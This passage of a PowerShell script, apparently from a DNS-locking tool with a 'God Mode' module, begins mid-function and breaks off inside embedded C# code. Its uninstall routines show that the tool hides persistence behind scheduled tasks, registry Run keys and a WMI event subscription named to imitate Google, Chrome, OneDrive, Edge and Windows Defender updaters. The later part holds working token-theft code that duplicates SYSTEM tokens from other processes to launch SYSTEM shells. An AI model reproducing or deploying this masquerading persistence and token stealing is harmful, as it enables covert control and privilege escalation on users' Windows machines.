    # Remove tasks
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed main task $GodModeTaskName." -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeGuardianName -Confirm:$false | Out-Null
        Write-Log -Message "Removed guardian $GodModeGuardianName." -Type "INFO" -Color Gray
    }

    # Remove backup tasks
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }
    # Remove deep persistence backup tasks
    $DeepPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
    foreach ($Prefix in $DeepPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # Remove registry persistence
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    # Remove deep persistence registry keys
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove deep persistence registry: $_" -Type "WARN" -Color Yellow }

    # Remove global CLI
    if (Test-Path $GodModeCmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $GodModeCmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $GodModeCmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop
        } catch {
            $Result = Invoke-AsSystem -Command "takeown.exe /F `"$GodModeCmdPath`" & icacls.exe `"$GodModeCmdPath`" /reset & cmd /c del /f /q `"$GodModeCmdPath`""
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $GodModeCmdPath. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $GodModeCmdPath) {
            Write-Log -Message "Failed to remove godmode CLI." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed godmode CLI." -Type "INFO" -Color Gray
        }
    }

    # Remove PATH entry
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$GodModeInstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $GodModeInstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $GodModeInstallDir from PATH." -Type "INFO" -Color Gray
        }
    } catch { Write-Log -Message "Failed to clean PATH: $_" -Type "ERROR" -Color Red }

    # Remove install dir
    if (Test-Path $GodModeInstallDir) {
        # Explicitly delete the installed script file first (bypass ACLs via cmd)
        if (Test-Path $GodModeInstallScript) {
            cmd /c "del /f /q `"$GodModeInstallScript`"" | Out-Null
        }
        try {
            Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $GodModeInstallDir. Trying SYSTEM cleanup..." -Type "INFO" -Color Yellow
            $SystemCmd = "takeown /F `"$GodModeInstallDir`" /R /D Y & icacls `"$GodModeInstallDir`" /reset /T /C /Q & cmd /c rd /s /q `"$GodModeInstallDir`" 2>nul"
            $Result = Invoke-AsSystem -Command $SystemCmd
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $GodModeInstallDir. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $GodModeInstallDir) {
            Write-Log -Message "SYSTEM cleanup failed: $GodModeInstallDir still exists." -Type "ERROR" -Color Red
            if (Test-Path $GodModeInstallScript) {
                Write-Log -Message "GodMode.ps1 still exists inside install dir." -Type "ERROR" -Color Red
            }
        } else {
            Write-Log -Message "God Mode directory removed." -Type "INFO" -Color Gray
        }
    }

    # Final verification
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GodModeTaskName still exists." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Guardian $GodModeGuardianName still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeInstallDir) { $FailedCount++; Write-Log -Message "Install dir $GodModeInstallDir still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeCmdPath) { $FailedCount++; Write-Log -Message "CLI $GodModeCmdPath still exists." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH still contains $GodModeInstallDir." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] GOD MODE UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
    }
    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "EXIT" -Message "Complete"
}

function Uninstall-Persistence {
    # Exit early if nothing is installed
    $IsInstalled = (Test-Path $InstallDir) -or (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] DNS-Guard is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling DNS-Guard from System..." -Type "ACTION" -Color Yellow

    # GPO registry cleanup is handled by Disable-DNSLock; no separate ACL relaxation needed

    # Unlock the network FIRST (so it can safely write to the log file)
    Disable-DNSLock

    # Remove the Scheduled Tasks (including both guardians)
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $Guardian2Name = "Windows-Defender-AM-Updates"
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Background Task: $TaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GuardianTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 1: $GuardianTaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $Guardian2Name -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 2: $Guardian2Name" -Type "INFO" -Color Gray
    }

    # Remove WMI Event Subscription
    Write-Log -Message "Removing WMI event subscription..." -Type "INFO" -Color Gray
    try {
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%WindowsUpdateHealthCheck%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove WMI subscription: $_" -Type "WARN" -Color Yellow }
    
    # Remove the integrity hash registry key
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (Test-Path $IntegrityRegPath) {
        Remove-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction SilentlyContinue
    }

    # Remove Global CLI Command (relax ACL first) - then delete via SYSTEM helper if needed
    if (Test-Path $CmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $CmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $CmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $CmdPath -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $CmdPath. Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            $Result = Invoke-AsSystem -Command "takeown.exe /F `"$CmdPath`" & icacls.exe `"$CmdPath`" /reset & cmd /c del /f /q `"$CmdPath`""
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $CmdPath. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $CmdPath) {
            Write-Log -Message "Failed to remove 'dnslock' CLI Alias at $CmdPath." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed 'dnslock' CLI Alias." -Type "INFO" -Color Gray
        }
    }

    # Remove local wrapper and PATH entry
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { Remove-Item -Path $CmdPathLocal -Force -ErrorAction SilentlyContinue }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$InstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $InstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $InstallDir from system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to clean system PATH: $_" -Type "ERROR" -Color Red
    }
    
    # Delete System Directory LAST - use SYSTEM helper if direct deletion fails (hardened ACLs)
    if (Test-Path $InstallDir) {
        Write-Log -Message "Removing hardened installation directory..." -Type "INFO" -Color Gray
        # Explicitly delete the installed script file first (bypass ACLs via cmd)
        if (Test-Path $InstallScript) {
            cmd /c "del /f /q `"$InstallScript`"" | Out-Null
        }
        try {
            Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction Stop
            Write-Log -Message "Installation directory removed." -Type "INFO" -Color Gray
        } catch {
            Write-Log -Message "Direct deletion failed (hardened ACLs). Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            $SystemCmd = "takeown /F `"$InstallDir`" /R /D Y & icacls `"$InstallDir`" /reset /T /C /Q & cmd /c rd /s /q `"$InstallDir`" 2>nul"
            $Result = Invoke-AsSystem -Command $SystemCmd
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $InstallDir. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
            if (Test-Path $InstallDir) {
                Write-Log -Message "SYSTEM cleanup failed: $InstallDir still exists." -Type "ERROR" -Color Red
                Write-Log -Message "[DEBUG] Directory contents: $(Get-ChildItem -Path $InstallDir -Force | Select-Object Name | Out-String)" -Type "ERROR" -Color Red
            } else {
                Write-Log -Message "Installation directory removed by SYSTEM. Goodbye!" -Type "INFO" -Color Gray
            }
        }
    }

    # Final status verification: check if any artifacts still remain
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $TaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GuardianTaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $Guardian2Name still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $InstallDir) { $FailedCount++; Write-Log -Message "Install directory $InstallDir still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $CmdPath) { $FailedCount++; Write-Log -Message "Global CLI $CmdPath still exists after uninstall." -Type "ERROR" -Color Red }
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { $FailedCount++; Write-Log -Message "Local wrapper $CmdPathLocal still exists after uninstall." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH still contains $InstallDir after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $IntegrityRegPath) { Write-Log -Message "Registry key $IntegrityRegPath still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiFilter) { Write-Log -Message "WMI event filter still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiConsumer) { Write-Log -Message "WMI event consumer still exists after uninstall." -Type "WARN" -Color Yellow }

    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed to remove)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 7. GOD MODE MODULE (MERGED FROM God mode.ps1)
# ============================================================================
# WARNING: These functions disable Windows security features and are extremely
# dangerous. Only the Built-in Administrator account may use them.
# ============================================================================

function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    # Allow both Built-in Administrator (SID ending in -500) and SYSTEM (S-1-5-18)
    return ($sid -like "*-500" -or $sid -eq "S-1-5-18")
}

function Test-GodModeActive {
    # Reads the God Mode active flag ($GodModeFlagRegPath.$GodModeFlagRegName == 1).
    # Used by Start-SystemShell to warn when God Mode is INACTIVE -- the on-demand
    # SYSTEM shell is most useful with God Mode ON (the monitor's Session>0 SYSTEM
    # shells are the token source Find-SystemProcessCandidate steals from). With
    # God Mode off there may be no Session>0 SYSTEM process, so the launch falls
    # back to a normal (non-SYSTEM) shell. Fail-open: any registry error -> $false
    # (treat as inactive so the best-effort warning fires).
    try {
        $flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
        if ($flag -and $flag.$GodModeFlagRegName -eq 1) { return $true }
    } catch {}
    return $false
}

function Test-SystemContext {
    Write-Host "`n[VERIFY] Running whoami as SYSTEM..." -ForegroundColor Cyan
    $Result = Invoke-AsSystem -Command "whoami & whoami /groups"
    if ($Result.Success -and $Result.Output) {
        Write-Host "[SUCCESS] SYSTEM context verified:" -ForegroundColor Green
        Write-Host $Result.Output -ForegroundColor Green
    } else {
        Write-Host "[FAIL] Could not verify SYSTEM context." -ForegroundColor Red
        if ($Result.Output) { Write-Host "Output: $($Result.Output)" -ForegroundColor Yellow }
    }
    Write-Host "`n[NOTE] Your current session runs as Administrator. God Mode does not change your user account." -ForegroundColor DarkGray
    Write-Host "       The SYSTEM context is only used for background tasks and hardened cleanup operations." -ForegroundColor DarkGray
}

function Get-CurrentUserSidInfo {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    $isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $adminCheck = $isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    return [PSCustomObject]@{ SID = $sid; IsAdmin = $adminCheck; IsBuiltInAdmin = ($sid -like "*-500") }
}

# --- Hybrid Token Stealing Elevation (Option 7 Enhancement) ---
# Adds C# P/Invoke to duplicate a SYSTEM token from a running process and spawn
# a new process with it. Falls back to scheduled-task elevation if token stealing fails.
# This makes God Mode robust across different Windows builds where SYSTEM processes vary.

$TokenOpsType = @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class TokenOps {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    public const uint PROCESS_VM_READ = 0x0010;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;

    public const int SecurityImpersonation = 2;
    public const int SecurityIdentification = 1;
    public const int TokenPrimary = 1;
    public const int TokenImpersonation = 2;

    public const int LOGON_WITH_PROFILE = 1;
    public const int LOGON_NETCREDENTIALS_ONLY = 2;

    public const uint CREATE_NEW_CONSOLE = 0x00000010;
    public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    public const uint CREATE_NO_WINDOW = 0x08000000;

    public const string SE_DEBUG_NAME = "SeDebugPrivilege";
    public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
    public const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";

    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static bool EnablePrivilege(string privilegeName) {
        IntPtr hToken = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) {
            return false;
        }
        try {
            LUID luid;
            if (!LookupPrivilegeValue(null, privilegeName, out luid)) return false;
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES[3]
            };
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(hToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
            int err = Marshal.GetLastWin32Error();
            return ok && err == 0;
        } finally {
            CloseHandle(hToken);
        }
    }

    public static bool TestOpenProcess(int pid) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return false;
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) return false;
            try {
                IntPtr hDupToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken)) return false;
                CloseHandle(hDupToken);
                return true;
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }

    public static int CreateProcessFromToken(int pid, string appName, string cmdLine, bool hideWindow) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return Marshal.GetLastWin32Error();
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) {
                return Marshal.GetLastWin32Error();
            }
            try {
                IntPtr hDupToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken)) {
                    return Marshal.GetLastWin32Error();
                }
                try {
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = "WinSta0\\Default";
                    if (hideWindow) {
                        si.dwFlags = 0x00000001;
                        si.wShowWindow = 0;
                    }
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    uint creationFlags = CREATE_UNICODE_ENVIRONMENT;
                    if (hideWindow) creationFlags |= CREATE_NO_WINDOW;
                    else creationFlags |= CREATE_NEW_CONSOLE;

                    string app = appName;
                    string cmd = cmdLine;
                    if (string.IsNullOrEmpty(cmd)) { cmd = appName; }

                    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, app, cmd, creationFlags, IntPtr.Zero, null, ref si, out pi)) {
                        return Marshal.GetLastWin32Error();
                    }
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return 0;
                } finally {
                    CloseHandle(hDupToken);
                }
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref int TokenInformation, int TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

    // ExactSpelling + EntryPoint: force .NET to look up exactly
    // "WTSGetActiveConsoleSessionId" (no A/W suffix probing). Without it the
    // default CharSet.None/ExactSpelling=false path can throw
    // EntryPointNotFoundException on some Windows 11 builds (26100+ API-set
    // forwarding quirk) even though the function IS exported. The try/catch in
    // CreateProcessAsSystem below is the fail-open safety net regardless.
    [DllImport("wtsapi32.dll", ExactSpelling = true, EntryPoint = "WTSGetActiveConsoleSessionId", SetLastError = true)]
    public static extern uint WTSGetActiveConsoleSessionId();

    public const int TokenSessionId = 12;

    // Sentinel returned by CreateProcessAsSystem when the stolen SYSTEM token lives
    // in Session 0 and SeTcbPrivilege is unavailable to relocate it to the active
    // interactive session. The caller must NOT birth the child ownerless -- it
    // falls through to the service-based elevation path instead. Negative so it
    // never collides with a real Win32 error code (which are positive DWORDs).
    public const int SESSION0_REFUSED = -1;

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    public static int CreateProcessAsSystem(int pid, string appName, string cmdLine, bool hideWindow) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return Marshal.GetLastWin32Error();
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) {
                return Marshal.GetLastWin32Error();
            }
            try {
                IntPtr hPrimaryToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hPrimaryToken)) {
                    return Marshal.GetLastWin32Error();
                }
                try {
                    // Resolve the active interactive console session. If no console is
                    // attached (0xFFFFFFFF) default to 1 -- the typical interactive session.
                    // FAIL-OPEN: on some Windows 11 builds (26100+) the wtsapi32.dll
                    // P/Invoke throws EntryPointNotFoundException at runtime (API-set
                    // forwarding quirk) even though gmproxy.c's GetProcAddress finds it.
                    // Find-SystemProcessCandidate already catches this and defaults to 1;
                    // CreateProcessAsSystem MUST do the same or the exception propagates
                    // uncaught through Monitor-ElevateProcess Phase 1 -> Start-Monitoring
                    // loop exception -> the shell is never elevated (whoami -> admin).
                    // Defaulting to 1 is correct for a single interactive desktop (the
                    // only configuration God Mode targets).
                    uint activeSession = 1;
                    try { activeSession = WTSGetActiveConsoleSessionId(); } catch { activeSession = 1; }
                    if (activeSession == 0xFFFFFFFF) activeSession = 1;

                    // Query the duplicated token's session. A Session-0 token (sourced from
                    // services.exe / svchost when winlogon/dwm/fontdrvhost are PPL-protected)
                    // would birth the child ownerless in Session 0 -> empty User column, no
                    // visible window. We MUST relocate it to the active session before launch.
                    int tokenSession = 0;
                    IntPtr tokenInfo = IntPtr.Zero;
                    try {
                        tokenInfo = Marshal.AllocHGlobal(4);
                        int returnLength = 0;
                        if (GetTokenInformation(hPrimaryToken, TokenSessionId, tokenInfo, 4, out returnLength)) {
                            tokenSession = Marshal.ReadInt32(tokenInfo);
                        }
                    } finally {
                        if (tokenInfo != IntPtr.Zero) Marshal.FreeHGlobal(tokenInfo);
                    }

                    // SeTcbPrivilege ("Act as part of the operating system") is required for
                    // SetTokenInformation(TokenSessionId) to relocate a token across sessions.
                    // Only held when running as SYSTEM (this path is guarded by $isSystem in
                    // PowerShell). Enable it best-effort; if it is absent, relocation fails.
                    EnablePrivilege("SeTcbPrivilege");

                    if (tokenSession != (int)activeSession) {
                        int sid = (int)activeSession;
                        if (!SetTokenInformation(hPrimaryToken, TokenSessionId, ref sid, 4)) {
                            // Refuse ownerless birth: return a distinctive sentinel so the
                            // PowerShell caller logs it and falls through to the service path
                            // (Monitor-ElevateProcess Phase 2) instead of producing a broken
                            // ownerless window (empty User column / no launch).
                            return SESSION0_REFUSED;
                        }
                    }

                    // Use CreateProcessWithTokenW (not CreateProcessAsUser).
                    // CreateProcessAsUser fails with ERROR_ACCESS_DENIED (5) on
                    // Windows 11 26100+ even with SeTcbPrivilege + SeAssignPrimary-
                    // TokenPrivilege enabled -- it has cross-session restrictions
                    // that deny a Session-0 monitor from birthing a Session-1 child
                    // even when the token has been relocated to Session 1. This was
                    // the root cause of "CreateProcessAsSystem failed for powershell
                    // (Win32 error 5)" -> the monitor fell through to Phase 2
                    // (gmproxy service kill+relaunch) which KILLED the user's shell.
                    // CreateProcessWithTokenW only needs SeImpersonatePrivilege
                    // (already enabled by Enable-ElevationPrivileges) and has NO
                    // cross-session restriction -- it births the child in the TOKEN's
                    // session, regardless of the caller's session. This is the SAME
                    // API that CreateProcessFromToken (menu [19] on-demand shell)
                    // and gmproxy.exe both use successfully (the gmproxy logs prove
                    // it: "Launched powershell.exe as SYSTEM (PID=6872, session=1)").
                    // The LOGON_WITH_PROFILE flag matches CreateProcessFromToken.
                    STARTUPINFO si = new STARTUPINFO();
